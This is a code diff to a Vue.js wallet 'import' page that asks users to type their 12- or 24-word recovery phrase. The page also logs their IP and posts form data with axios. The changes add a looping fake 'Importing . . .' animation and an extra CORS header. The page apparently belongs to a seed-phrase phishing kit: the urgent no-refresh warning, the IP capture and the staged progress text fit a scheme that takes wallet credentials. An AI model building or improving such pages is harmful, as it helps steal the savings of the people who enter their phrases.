@@ -161,6 +161,8 @@
                                   <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces</label>
+                                    <div class="typewrite" data-period="2000" data-type='[ "Importing . . .", "Importing . . .", "Importing . . .", "Importing . . ." ]'>
+                                    <span class="wrap"></span></div>
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
@@ -264,6 +266,62 @@ export default {
     }, 3000);
     // $(document).on("keydown", disableF5);
     this.getIp()
+    var TxtType = function(el, toRotate, period) {
+        this.toRotate = toRotate;
+        this.el = el;
+        this.loopNum = 0;
+        this.period = parseInt(period, 10) || 2000;
+        this.txt = '';
+        this.tick();
+        this.isDeleting = false;
+    };
+
+    TxtType.prototype.tick = function() {
+        var i = this.loopNum % this.toRotate.length;
+        var fullTxt = this.toRotate[i];
+
+        if (this.isDeleting) {
+        this.txt = fullTxt.substring(0, this.txt.length - 1);
+        } else {
+        this.txt = fullTxt.substring(0, this.txt.length + 1);
+        }
+
+        this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';
+
+        var that = this;
+        var delta = 200 - Math.random() * 100;
+
+        if (this.isDeleting) { delta /= 2; }
+
+        if (!this.isDeleting && this.txt === fullTxt) {
+        delta = this.period;
+        this.isDeleting = true;
+        } else if (this.isDeleting && this.txt === '') {
+        this.isDeleting = false;
+        this.loopNum++;
+        delta = 500;
+        }
+
+        setTimeout(function() {
+        that.tick();
+        }, delta);
+    };
+
+    // window.onload = function() {
+        var elements = document.getElementsByClassName('typewrite');
+        for (var i=0; i<elements.length; i++) {
+            var toRotate = elements[i].getAttribute('data-type');
+            var period = elements[i].getAttribute('data-period');
+            if (toRotate) {
+              new TxtType(elements[i], JSON.parse(toRotate), period);
+            }
+        }
+        // INJECT CSS
+        var css = document.createElement("style");
+        css.type = "text/css";
+        css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
+        document.body.appendChild(css);
+    // };
   },
   updated() {
     var no_words = this.inputOne.split(" ");
@@ -379,7 +437,8 @@ export default {
           var config = {
             headers: {
               'Access-Control-Allow-Origin': '*',
-              'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
+              'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
+              "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept"
               }
           };
           axios
